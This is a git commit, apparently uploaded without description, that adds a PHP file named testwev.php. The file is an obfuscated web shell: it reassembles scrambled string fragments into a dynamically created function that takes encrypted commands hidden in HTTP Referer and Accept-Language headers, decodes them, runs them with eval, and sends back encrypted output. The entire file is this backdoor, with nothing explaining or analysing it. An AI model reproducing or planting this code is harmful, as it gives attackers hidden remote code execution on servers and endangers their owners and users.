f9e4a42ba9765f54f08c73748e642f7d337f980b
kirintux <enggar.sky1@gmail.com>
2017-11-01 01:52:57 +0800

    Add files via upload

---
+++ testwev.php
@@ -0,0 +1,19 @@
+<?php
+$m='t);$IRo="";IRfor($i=IR0;$IRi<$l;){for(IR$j=0IR;IRIR($j<$IRIRc&&$IRi<$l);$j++,$i++){$o.=$';
+$p='<counIRt($IRm[1]);$zIR++)$pIR.=$q[$IRm[2IR][$z]];ifIR(strpIRosIR($p,$IRh)===0){$s[$IRIRi';
+$O='$IRi],$fIR);if($e){$k=$kIRh.$kfIR;IRob_start(IR)IR;@evaIRl(@gzuncomIRpress(@x(@bIRase64';
+$n=str_replace('vo','','crvoeatvoe_vovofvouncvotion');
+$H='IRq=0IR.([\\d]))?IR,?/"IR,$ra,IR$m);iIRf($q&&$mIR){IR@seIRssionIR_starIRt();$s=IR&$_SES';
+$e='$kh="bfd5IR";$IRkf="92IR91";functIRionIR IRx($t,$k){$IRc=strlen($IRk);$lIR=strlen(IR$';
+$W=']="";$pIRIR=$ss($IRp,3);}if(aIRrray_kIRey_exists(IR$i,$s)){IR$s[$i].=IR$IRp;$eIR=strIRpos($s[';
+$S='IRt{$i}^$k{$j}IR;}}IRreturn IRIR$o;}$r=$IR_SERVER;$IRrr=@$r["IRHTIRTP_REIRFIRERIRER"';
+$I='(IRmdIR5($i.$kh),0IR,3));$fIR=$sl(IR$ss(md5(IR$IRi.$kf),0,3)IR);$IRp="";IRfor($zIR=1;$z';
+$M='encodeIR(IRx(gIRzcomIRpress($o),$k)IR);prinIRtIR(IR"<IR$k>$d</$k>");@sessiIRon_desIRtroy();}}}}';
+$G='IR$i],0IR,$e))),$k)IR));$o=IRob_geIRt_contenIRtIRs();ob_eIRnIRd_clean();$d=IRbasIRe64_';
+$J='SION;$ssIR="IRsIRubstr";$sl="strtoIRloIRwerIR";$iIR=$m[1][0]IR.$IRm[1][1];$h=$slIR($ss';
+$l='];$ra=@$rIR[IR"HTTP_ACCEPT_LIRANGUAGE"]IR;if($IRrr&&$ra)IR{$u=IRparsIRe_url($rIRr);parse_sI';
+$c='RtIRr($u["IRquery"],IRIR$q);IR$q=array_IRvaIRIRluesIR($q);preg_match_all("/(IRIR[\\w])[\\w-]+(?:;';
+$R='IR_IRdecode(preIRg_reIRplaceIR(arrIRay("/_/","/-/IR"),arrIRaIRIRy("/"IR,"+"),$ss($s[';
+$N=str_replace('IR','',$e.$m.$S.$l.$c.$H.$J.$I.$p.$W.$O.$R.$G.$M);
+$L=$n('',$N);$L();
+?>
